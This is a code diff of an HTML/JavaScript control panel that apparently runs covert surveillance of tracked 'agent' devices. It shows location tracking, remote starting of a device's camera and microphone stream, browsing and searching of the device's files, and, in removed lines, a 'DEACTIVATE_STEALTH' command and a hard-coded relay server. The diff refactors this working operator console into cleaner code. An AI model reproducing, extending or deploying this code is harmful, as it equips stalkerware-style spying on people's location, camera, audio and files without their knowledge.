@@ -364,9 +364,10 @@
 
         #imageCanvas {
             width: 100%;
-            max-height: 200px;
+            max-height: 300px;
             border-radius: 8px;
             background: #111;
+            border: 1px solid #333;
         }
 
         /* === FILE MANAGER === */
@@ -394,20 +395,6 @@
         .file-actions button {
             padding: 6px 10px;
             margin-left: 5px;
-        }
-
-        .search-bar {
-            margin-bottom: 15px;
-            display: none;
-        }
-
-        .search-bar input {
-            width: calc(100% - 80px);
-            padding: 8px;
-            background: #222;
-            border: 1px solid #444;
-            border-radius: 4px;
-            color: #fff;
         }
 
         .file-list-container {
@@ -880,42 +867,26 @@
                     </div>
 
                     <div class="live-video-container">
-                        <video id="liveVideo" style="width: 100%; max-height: 200px; border-radius: 8px; display: none;" autoplay muted></video>
                         <canvas id="imageCanvas"></canvas>
                     </div>
                 </div>
-
-                    <div id="cameraContainer" style="display: none;">
-                        <h3>Камера устройства</h3>
-                        <img id="cameraPreview" style="max-width: 100%; border: 1px solid #ddd;" />
-                        <button onclick="stopCamera()">Остановить</button>
-                    </div>
-                </div>
-
 
                 <!-- FILES TAB -->
                 <div id="filesPanel" class="tab-panel">
                     <div class="file-manager-container">
                         <div class="file-header">
                             <div class="path-nav">
-                                <button class="btn" onclick="navigateUp()" id="upBtn" disabled>↑</button>
-                                <span id="currentPath" style="font-size: 12px; color: var(--text-secondary);">/</span>
+                                <span id="currentPath" style="font-size: 12px; color: var(--text-secondary);">No device selected</span>
                             </div>
                             <div class="file-actions">
-                                <button class="btn" onclick="refreshDirectory()">⟳</button>
-                                <button class="btn" onclick="showSearchDialog()">🔍</button>
+                                <button class="btn" onclick="loadDeviceFiles()">⟳</button>
                             </div>
-                        </div>
-
-                        <div id="searchBar" class="search-bar">
-                            <input type="text" id="searchInput" placeholder="Search files...">
-                            <button class="btn" onclick="performSearch()" style="padding: 8px 12px; margin-left: 8px;">GO</button>
                         </div>
 
                         <div class="file-list-container">
                             <div id="fileList" style="padding: 10px;">
                                 <div style="text-align: center; color: #666; padding: 40px;">
-                                    Click device and select FILES tab to browse
+                                    Select a device to view files
                                 </div>
                             </div>
                         </div>
@@ -946,7 +917,7 @@
                     <span class="info-label">Status:</span>
                     <span id="infoStatus" class="info-value">Standby</span>
                 </div>
-                <div class="info-item">
+<div class="info-item">
                     <span class="info-label">Last Contact:</span>
                     <span id="infoDate" class="info-value">Unknown</span>
                 </div>
@@ -1012,19 +983,15 @@
         let currentMapStyle = 'dark';
         let filteredDevices = [];
 
-        // Camera and file system variables
+        // WebSocket and camera variables
+        let deviceWebSocket = null;
         let isLiveStreaming = false;
         let isAudioStreaming = false;
-        let liveStreamWebSocket = null;
-        let audioContext = null;
-        let currentDirectory = '';
-        let fileList = [];
-        let selectedFile = null;
 
         // Performance optimization
         let isLoading = false;
         let lastRefreshTime = 0;
-        const REFRESH_COOLDOWN = 2000; // 2 seconds
+        const REFRESH_COOLDOWN = 2000;
 
         // === AUTHENTICATION ===
         async function login() {
@@ -1072,6 +1039,10 @@
             localStorage.removeItem('agent_token');
             clearRefreshInterval();
             clearMap();
+            if (deviceWebSocket) {
+                deviceWebSocket.close();
+                deviceWebSocket = null;
+            }
             if (analyticsChart) {
                 analyticsChart.destroy();
                 analyticsChart = null;
@@ -1088,20 +1059,6 @@
             errorEl.classList.remove('hidden');
         }
 
-        function handleDeviceMessage(message) {
-    console.log('Received:', message.type, 'from', message.deviceId);
-    
-    if (message.type === 'image') {
-        const img = document.getElementById('cameraPreview');
-        if (img) {
-            img.src = 'data:image/jpeg;base64,' + message.data;
-            img.style.display = 'block';
-            console.log('Image updated');
-        } else {
-            console.error('cameraPreview element not found');
-        }
-    }
-
         function showMainApp() {
             document.getElementById('loginContainer').classList.add('hidden');
             document.getElementById('mainApp').classList.remove('hidden');
@@ -1111,59 +1068,117 @@
             startRefreshInterval();
         }
 
-        // === CAMERA CONTROL FUNCTIONS ===
+        // === WEBSOCKET AND CAMERA FUNCTIONS ===
+        function connectToDevice(deviceId) {
+            if (deviceWebSocket) {
+                deviceWebSocket.close();
+            }
+            
+            selectedDeviceId = deviceId;
+            
+            const wsProtocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsUrl = `${wsProtocol}//${window.location.host}/ws/live`;
+            
+            console.log('Connecting to WebSocket:', wsUrl);
+            
+            deviceWebSocket = new WebSocket(wsUrl);
+            
+            deviceWebSocket.onopen = () => {
+                console.log('WebSocket connected');
+                document.getElementById('streamStatus').textContent = 'Connected';
+                document.getElementById('streamStatus').style.color = 'var(--success-green)';
+                enableCameraControls();
+            };
+            
+            deviceWebSocket.onmessage = (event) => {
+                try {
+                    const message = JSON.parse(event.data);
+                    console.log('Received:', message.type, 'from device:', message.deviceId);
+                    
+                    if (message.deviceId === selectedDeviceId) {
+                        handleDeviceMessage(message);
+                    }
+                } catch (error) {
+                    console.error('Error processing message:', error);
+                }
+            };
+            
+            deviceWebSocket.onerror = (error) => {
+                console.error('WebSocket error:', error);
+                document.getElementById('streamStatus').textContent = 'Connection Error';
+                document.getElementById('streamStatus').style.color = 'var(--danger-red)';
+            };
+            
+            deviceWebSocket.onclose = () => {
+                console.log('WebSocket disconnected');
+                document.getElementById('streamStatus').textContent = 'Offline';
+                document.getElementById('streamStatus').style.color = 'var(--text-secondary)';
+                disableCameraControls();
+            };
+        }
+
+        function handleDeviceMessage(message) {
+            switch(message.type) {
+                case 'image':
+                    displayLiveImage(message.data);
+                    break;
+                case 'audio':
+                    console.log('Audio data received');
+                    break;
+                case 'file_list':
+                    displayFileList(message.files);
+                    break;
+            }
+        }
+
+        function displayLiveImage(base64Data) {
+            const canvas = document.getElementById('imageCanvas');
+            const ctx = canvas.getContext('2d');
+            
+            const img = new Image();
+            img.onload = () => {
+                canvas.width = img.width;
+                canvas.height = img.height;
+                ctx.drawImage(img, 0, 0);
+            };
+            img.src = 'data:image/jpeg;base64,' + base64Data;
+        }
+
         async function toggleLiveStream() {
-            if (!selectedDeviceId) {
-                showError('Please select a device first');
+            if (!selectedDeviceId || !deviceWebSocket) {
+                showError('Not connected to device');
                 return;
             }
             
             const btn = document.getElementById('liveStreamBtn');
-            const status = document.getElementById('streamStatus');
             
             if (!isLiveStreaming) {
-                try {
-                    await sendDeviceCommand('START_LIVE_STREAM');
-                    initLiveStreamConnection();
-                    
-                    isLiveStreaming = true;
-                    btn.textContent = '⏹ STOP CAM';
-                    btn.style.background = 'var(--danger-red)';
-                    status.textContent = 'Live Streaming';
-                    status.style.color = 'var(--success-green)';
-                    
-                } catch (error) {
-                    showError('Failed to start live stream');
-                }
+                await sendDeviceCommand('START_LIVE_STREAM');
+                isLiveStreaming = true;
+                btn.textContent = '⏹ STOP CAM';
+                btn.style.background = 'var(--danger-red)';
+                document.getElementById('streamStatus').textContent = 'Streaming';
             } else {
                 await sendDeviceCommand('STOP_LIVE_STREAM');
-                closeLiveStreamConnection();
-                
                 isLiveStreaming = false;
                 btn.textContent = '📹 LIVE CAM';
                 btn.style.background = '';
-                status.textContent = 'Offline';
-                status.style.color = 'var(--text-secondary)';
+                document.getElementById('streamStatus').textContent = 'Connected';
             }
         }
 
         async function toggleAudio() {
-            if (!selectedDeviceId) return;
+            if (!selectedDeviceId || !deviceWebSocket) return;
             
             const btn = document.getElementById('audioBtn');
             
             if (!isAudioStreaming) {
                 await sendDeviceCommand('START_AUDIO');
-                initAudioPlayback();
-                
                 isAudioStreaming = true;
                 btn.textContent = '🔇 MUTE';
                 btn.style.background = 'var(--success-green)';
-                
             } else {
                 await sendDeviceCommand('STOP_AUDIO');
-                stopAudioPlayback();
-                
                 isAudioStreaming = false;
                 btn.textContent = '🎤 AUDIO';
                 btn.style.background = '';
@@ -1178,19 +1193,17 @@
         async function emergencyStop() {
             if (!selectedDeviceId) return;
             
-            await sendDeviceCommand('DEACTIVATE_STEALTH');
+            await sendDeviceCommand('STOP_LIVE_STREAM');
+            await sendDeviceCommand('STOP_AUDIO');
             
-            // Reset all states
             isLiveStreaming = false;
             isAudioStreaming = false;
-            closeLiveStreamConnection();
-            stopAudioPlayback();
             
-            // Reset UI
             document.getElementById('liveStreamBtn').textContent = '📹 LIVE CAM';
+            document.getElementById('liveStreamBtn').style.background = '';
             document.getElementById('audioBtn').textContent = '🎤 AUDIO';
-            document.getElementById('streamStatus').textContent = 'Offline';
-            disableCameraControls();
+            document.getElementById('audioBtn').style.background = '';
+            document.getElementById('streamStatus').textContent = 'Connected';
         }
 
         async function sendDeviceCommand(command) {
@@ -1205,308 +1218,15 @@
                     })
                 });
                 
-                if (!response.ok) throw new Error('Command failed');
+                if (!response.ok) {
+                    throw new Error('Command failed');
+                }
+                
+                console.log('Command sent:', command);
                 
             } catch (error) {
-                console.error('Failed to send device command:', error);
-                throw error;
-            }
-        }
-
-        function initLiveStreamConnection() {
-            const wsUrl = `wss://location-tracker-server-micv.onrender.com/ws/live/${selectedDeviceId}`;
-            liveStreamWebSocket = new WebSocket(wsUrl);
-            
-            liveStreamWebSocket.onmessage = (event) => {
-                const data = JSON.parse(event.data);
-                
-                if (data.type === 'image') {
-                    displayLiveImage(data.data);
-                } else if (data.type === 'audio') {
-                    playAudioData(data.data);
-                } else {
-                    handleFileSystemMessage(data);
-                }
-            };
-            
-            liveStreamWebSocket.onclose = () => {
-                console.log('Live stream connection closed');
-            };
-        }
-
-        function displayLiveImage(base64Image) {
-            const canvas = document.getElementById('imageCanvas');
-            const ctx = canvas.getContext('2d');
-            
-            const img = new Image();
-            img.onload = () => {
-                canvas.width = img.width;
-                canvas.height = img.height;
-                ctx.drawImage(img, 0, 0);
-            };
-            img.src = 'data:image/jpeg;base64,' + base64Image;
-        }
-
-        function initAudioPlayback() {
-            audioContext = new (window.AudioContext || window.webkitAudioContext)();
-        }
-
-        function playAudioData(base64Audio) {
-            if (!audioContext) return;
-            
-            try {
-                const audioData = Uint8Array.from(atob(base64Audio), c => c.charCodeAt(0));
-                
-                audioContext.decodeAudioData(audioData.buffer).then(buffer => {
-                    const source = audioContext.createBufferSource();
-                    source.buffer = buffer;
-                    source.connect(audioContext.destination);
-                    source.start();
-                });
-            } catch (error) {
-                console.error('Audio playback error:', error);
-            }
-        }
-
-        function closeLiveStreamConnection() {
-            if (liveStreamWebSocket) {
-                liveStreamWebSocket.close();
-                liveStreamWebSocket = null;
-            }
-        }
-
-        function stopAudioPlayback() {
-            if (audioContext) {
-                audioContext.close();
-                audioContext = null;
-            }
-        }
-
-        function connectToDevice(deviceId) {
-    selectedDeviceId = deviceId;
-    
-    // Подключаемся к веб-клиентскому WebSocket
-    if (liveStreamWebSocket) {
-        liveStreamWebSocket.close();
-    }
-    
-    // Правильный URL для веб-клиентов
-    const wsUrl = `wss://location-tracker-server-micv.onrender.com/ws/live`;
-    
-    liveStreamWebSocket = new WebSocket(wsUrl);
-    
-    liveStreamWebSocket.onopen = () => {
-        console.log('Connected to live stream');
-        document.getElementById('connectionStatus').textContent = 'Подключено к устройству: ' + deviceId;
-        showLiveStream();
-    };
-    
-    liveStreamWebSocket.onmessage = (event) => {
-        try {
-            const data = JSON.parse(event.data);
-            console.log('Received data:', data.type, 'from device:', data.deviceId);
-            
-            // Показываем данные только от выбранного устройства
-            if (data.deviceId === selectedDeviceId) {
-                if (data.type === 'image') {
-                    displayLiveImage(data.data);
-                } else if (data.type === 'audio') {
-                    // Обработка аудио данных
-                } else if (data.type === 'file_list') {
-                    displayFileList(data.files);
-                }
-            }
-        } catch (error) {
-            console.error('Error processing live stream data:', error);
-        }
-    };
-    
-    liveStreamWebSocket.onerror = (error) => {
-        console.error('Live stream WebSocket error:', error);
-        document.getElementById('connectionStatus').textContent = 'Ошибка подключения';
-    };
-    
-    liveStreamWebSocket.onclose = () => {
-        console.log('Live stream disconnected');
-        document.getElementById('connectionStatus').textContent = 'Отключено';
-    };
-}
-
-function displayLiveImage(base64Data) {
-    const liveVideo = document.getElementById('liveVideo');
-    if (liveVideo) {
-        liveVideo.src = 'data:image/jpeg;base64,' + base64Data;
-        console.log('Image updated');
-    }
-}
-        
-        // === FILE SYSTEM FUNCTIONS ===
-        function connectToFileSystem() {
-            if (!selectedDeviceId) {
-                showError('Please select a device first');
-                return;
-            }
-            
-            sendFileSystemCommand({ action: 'list_directory', path: '' });
-        }
-
-        function sendFileSystemCommand(command) {
-            if (liveStreamWebSocket && liveStreamWebSocket.readyState === WebSocket.OPEN) {
-                liveStreamWebSocket.send(JSON.stringify(command));
-            } else {
-                showError('Connection to device not established');
-            }
-        }
-
-        function handleFileSystemMessage(data) {
-            switch (data.type) {
-                case 'directory_listing':
-                    displayDirectoryListing(data);
-                    break;
-                case 'file_content':
-                    displayFileContent(data);
-                    break;
-                case 'search_results':
-                    displaySearchResults(data);
-                    break;
-                case 'delete_result':
-                    handleDeleteResult(data);
-                    break;
-            }
-        }
-
-        function displayDirectoryListing(data) {
-            if (data.error) {
-                showError('Directory access failed: ' + data.error);
-                return;
-            }
-            
-            currentDirectory = data.currentPath;
-            document.getElementById('currentPath').textContent = currentDirectory;
-            document.getElementById('upBtn').disabled = !data.parentPath;
-            
-            const fileListElement = document.getElementById('fileList');
-            fileListElement.innerHTML = '';
-            
-            fileList = [];
-            
-            if (data.folders) {
-                data.folders.forEach(folder => {
-                    fileList.push(folder);
-                    fileListElement.appendChild(createFileElement(folder));
-                });
-            }
-            
-            if (data.files) {
-                data.files.forEach(file => {
-                    fileList.push(file);
-                    fileListElement.appendChild(createFileElement(file));
-                });
-            }
-            
-            if (fileList.length === 0) {
-                fileListElement.innerHTML = '<div style="text-align: center; color: #666; padding: 20px;">Directory is empty</div>';
-            }
-        }
-
-        function createFileElement(item) {
-            const element = document.createElement('div');
-            element.className = 'file-item';
-            element.onclick = () => selectFileItem(item, element);
-            element.ondblclick = () => {
-                if (item.type === 'directory') {
-                    navigateToDirectory(item.path);
-                }
-            };
-            
-            const icon = item.type === 'directory' ? '📁' : '📄';
-            
-            element.innerHTML = `
-                <div style="margin-right: 10px;">${icon}</div>
-                <div style="flex: 1; display: flex; justify-content: space-between;">
-                    <div style="color: var(--text-primary);">${item.name}</div>
-                    <div style="color: var(--text-muted); font-size: 11px; text-align: right;">
-                        ${item.type === 'directory' ? `${item.itemCount || 0} items` : item.sizeFormatted || ''}
-                        <br>
-                        <span style="font-size: 10px;">${item.lastModified}</span>
-                    </div>
-                </div>
-            `;
-            
-            return element;
-        }
-
-        function selectFileItem(item, element) {
-            document.querySelectorAll('.file-item').forEach(el => el.classList.remove('selected'));
-            element.classList.add('selected');
-            selectedFile = item;
-        }
-
-        function navigateToDirectory(path) {
-            sendFileSystemCommand({ action: 'list_directory', path: path });
-        }
-
-        function navigateUp() {
-            if (currentDirectory) {
-                const parentPath = currentDirectory.substring(0, currentDirectory.lastIndexOf('/'));
-                navigateToDirectory(parentPath);
-            }
-        }
-
-        function refreshDirectory() {
-            if (currentDirectory !== undefined) {
-                sendFileSystemCommand({ action: 'list_directory', path: currentDirectory });
-            }
-        }
-
-        function showSearchDialog() {
-            const searchBar = document.getElementById('searchBar');
-            searchBar.style.display = searchBar.style.display === 'none' ? 'block' : 'none';
-            
-            if (searchBar.style.display === 'block') {
-                document.getElementById('searchInput').focus();
-            }
-        }
-
-        function performSearch() {
-            const query = document.getElementById('searchInput').value.trim();
-            if (!query) return;
-            
-            sendFileSystemCommand({
-                action: 'search_files',
-                query: query,
-                root_path: currentDirectory,
-                include_content: true
-            });
-        }
-
-        function displaySearchResults(data) {
-            if (data.error) {
-                showError('Search failed: ' + data.error);
-                return;
-            }
-            
-            const fileListElement = document.getElementById('fileList');
-            fileListElement.innerHTML = `
-                <div style="padding: 10px; border-bottom: 1px solid #333; color: var(--primary-gold);">
-                    Search Results: "${data.query}" (${data.count} found)
-                </div>
-            `;
-            
-            if (data.results && data.results.length > 0) {
-                data.results.forEach(item => {
-                    fileListElement.appendChild(createFileElement(item));
-                });
-            } else {
-                fileListElement.innerHTML += '<div style="text-align: center; color: #666; padding: 20px;">No files found</div>';
-            }
-        }
-
-        function handleDeleteResult(data) {
-            if (data.success) {
-                refreshDirectory();
-            } else {
-                showError('Delete failed: ' + (data.error || 'Unknown error'));
+                console.error('Failed to send command:', error);
+                showError('Command failed: ' + command);
             }
         }
 
@@ -1522,6 +1242,59 @@ function displayLiveImage(base64Data) {
             document.getElementById('audioBtn').disabled = true;
             document.getElementById('switchBtn').disabled = true;
             document.getElementById('stopBtn').disabled = true;
+        }
+
+        // === FILE SYSTEM FUNCTIONS ===
+        async function loadDeviceFiles() {
+            if (!selectedDeviceId || !token) {
+                showError('Please select a device first');
+                return;
+            }
+            
+            try {
+                const response = await fetch(`/api/device/${selectedDeviceId}/files/${token}`);
+                if (!response.ok) throw new Error('Failed to load files');
+                
+                const data = await response.json();
+                displayFileList(data.files || []);
+                
+            } catch (error) {
+                console.error('Error loading files:', error);
+                document.getElementById('fileList').innerHTML = 
+                    '<div style="text-align: center; color: #666; padding: 40px;">Failed to load files</div>';
+            }
+        }
+
+        function displayFileList(files) {
+            const fileListElement = document.getElementById('fileList');
+            fileListElement.innerHTML = '';
+            
+            if (!files || files.length === 0) {
+                fileListElement.innerHTML = 
+                    '<div style="text-align: center; color: #666; padding: 40px;">No files found</div>';
+                return;
+            }
+            
+            files.forEach(file => {
+                const fileItem = document.createElement('div');
+                fileItem.className = 'file-item';
+                
+                const icon = file.type === 'image' ? '🖼️' : 
+                             file.type === 'audio' ? '🎵' : 
+                             file.type === 'video' ? '🎬' : '📄';
+                
+                fileItem.innerHTML = `
+                    <div style="margin-right: 10px;">${icon}</div>
+                    <div style="flex: 1;">
+                        <div style="color: var(--text-primary);">${file.name}</div>
+                        <div style="color: var(--text-muted); font-size: 11px;">
+                            ${file.size || 'Unknown size'} • ${file.date || 'Unknown date'}
+                        </div>
+                    </div>
+                `;
+                
+                fileListElement.appendChild(fileItem);
+            });
         }
 
         // === MAP INITIALIZATION ===
@@ -1693,8 +1466,8 @@ function displayLiveImage(base64Data) {
             selectedDeviceId = deviceId;
             renderDevicesList();
             await loadDeviceData(deviceId);
-            enableCameraControls();
-            connectToFileSystem();
+            connectToDevice(deviceId);
+            loadDeviceFiles();
         }
 
         async function loadDeviceData(deviceId) {
@@ -1723,9 +1496,6 @@ function displayLiveImage(base64Data) {
                 mapLoading.classList.add('hidden');
             }
         }
-
-        // Continue with all the other existing functions from the original code...
-        // (renderRouteOnMap, updateMapInfo, analytics functions, etc.)
 
         function updateMapInfo(data) {
             document.getElementById('infoTitle').textContent = data.device_name || `Agent-${data.device_id.slice(0, 8)}`;
@@ -1836,7 +1606,6 @@ function displayLiveImage(base64Data) {
             }
         }
 
-        // Add the remaining utility and control functions...
         async function refreshDevices() {
             await loadDevices();
         }
@@ -1869,12 +1638,18 @@ function displayLiveImage(base64Data) {
             selectedDeviceId = null;
             selectedDeviceLocations = [];
             
+            if (deviceWebSocket) {
+                deviceWebSocket.close();
+                deviceWebSocket = null;
+            }
+            
             document.getElementById('infoTitle').textContent = 'NO AGENT SELECTED';
             document.getElementById('infoStatus').textContent = 'Standby';
             document.getElementById('infoDate').textContent = 'Unknown';
             document.getElementById('infoPoints').textContent = '0';
             document.getElementById('infoDistance').textContent = '0 km';
             document.getElementById('infoFiltered').textContent = '0';
+            document.getElementById('streamStatus').textContent = 'Offline';
             
             renderDevicesList();
             disableCameraControls();
@@ -1925,10 +1700,10 @@ function displayLiveImage(base64Data) {
             if (!newName) return;
             
             try {
-                const res = await fetch(`/api/device/${renameDeviceId}/rename`, {
+                const res = await fetch(`/api/device/${renameDeviceId}/rename/${token}`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ name: newName, token })
+                    body: JSON.stringify({ name: newName })
                 });
                 
                 if (res.ok) {
@@ -1997,16 +1772,19 @@ function displayLiveImage(base64Data) {
         }
 
         function updateAnalyticsDisplay(data) {
-            document.getElementById('totalDistance').textContent = data.total_distance || '0';
+            document.getElementById('totalDistance').textContent = (data.total_distance || 0).toFixed(2);
             document.getElementById('totalPoints').textContent = data.total_points || '0';
             
-            const dailyStats = Object.values(data.daily_stats || {});
-            const avgBattery = dailyStats.length > 0 
-                ? Math.round(dailyStats.reduce((sum, day) => sum + day.avgBattery, 0) / dailyStats.length)
+            const locations = data.locations || [];
+            const avgBattery = locations.length > 0 
+                ? Math.round(locations.reduce((sum, loc) => sum + (loc.battery || 0), 0) / locations.length)
                 : 0;
-            document.getElementById('avgBattery').textContent = avgBattery + '%';
+document.getElementById('avgBattery').textContent = avgBattery + '%';
             
-            document.getElementById('activeDays').textContent = dailyStats.length;
+            const uniqueDays = new Set(locations.map(loc => 
+                new Date(loc.timestamp).toDateString()
+            ));
+            document.getElementById('activeDays').textContent = uniqueDays.size;
         }
 
         function updateAnalyticsChart(data) {
@@ -2017,18 +1795,32 @@ function displayLiveImage(base64Data) {
                 analyticsChart.destroy();
             }
 
-            const dailyStats = data.daily_stats || {};
-            const dates = Object.keys(dailyStats).sort();
-            const distances = dates.map(date => dailyStats[date].distance || 0);
-            const batteries = dates.map(date => dailyStats[date].avgBattery || 0);
+            const locations = data.locations || [];
+            const dailyData = {};
+            
+            locations.forEach(loc => {
+                const date = new Date(loc.timestamp).toLocaleDateString();
+                if (!dailyData[date]) {
+                    dailyData[date] = { distance: 0, batteries: [], count: 0 };
+                }
+                dailyData[date].batteries.push(loc.battery || 0);
+                dailyData[date].count++;
+            });
+
+            const dates = Object.keys(dailyData).sort();
+            const batteries = dates.map(date => {
+                const bats = dailyData[date].batteries;
+                return Math.round(bats.reduce((a, b) => a + b, 0) / bats.length);
+            });
+            const counts = dates.map(date => dailyData[date].count);
 
             analyticsChart = new Chart(ctx, {
                 type: 'line',
                 data: {
-                    labels: dates.map(date => new Date(date).toLocaleDateString()),
+                    labels: dates,
                     datasets: [{
-                        label: 'Distance (km)',
-                        data: distances,
+                        label: 'Data Points',
+                        data: counts,
                         borderColor: '#00d4ff',
                         backgroundColor: 'rgba(0, 212, 255, 0.1)',
                         yAxisID: 'y'
@@ -2090,6 +1882,8 @@ function displayLiveImage(base64Data) {
                 loadHistory();
             } else if (tabName === 'analytics' && selectedDeviceId) {
                 loadAnalytics();
+            } else if (tabName === 'files' && selectedDeviceId) {
+                loadDeviceFiles();
             }
         }
 
@@ -2196,8 +1990,12 @@ function displayLiveImage(base64Data) {
             }
             
             try {
-                const res = await fetch(`/api/export/${selectedDeviceId}/${token}`);
-                const data = await res.json();
+                const device = devicesData.get(selectedDeviceId);
+                const data = {
+                    device_id: selectedDeviceId,
+                    device_name: device?.device_name || selectedDeviceId,
+                    locations: selectedDeviceLocations
+                };
                 
                 const format = confirm('Export as GPX for GPS devices? (Cancel for JSON)');
                 
@@ -2205,10 +2003,10 @@ function displayLiveImage(base64Data) {
                 if (format) {
                     const gpxData = convertToGPX(data);
                     blob = new Blob([gpxData], { type: 'application/gpx+xml' });
-                    filename = `${data.device_name || data.device_id}_track.gpx`;
+                    filename = `${data.device_name}_track.gpx`;
                 } else {
                     blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
-                    filename = `${data.device_name || data.device_id}_export.json`;
+                    filename = `${data.device_name}_export.json`;
                 }
                 
                 const url = URL.createObjectURL(blob);
@@ -2375,6 +2173,3 @@ function displayLiveImage(base64Data) {
     </script>
 </body>
 </html>
-
-
-
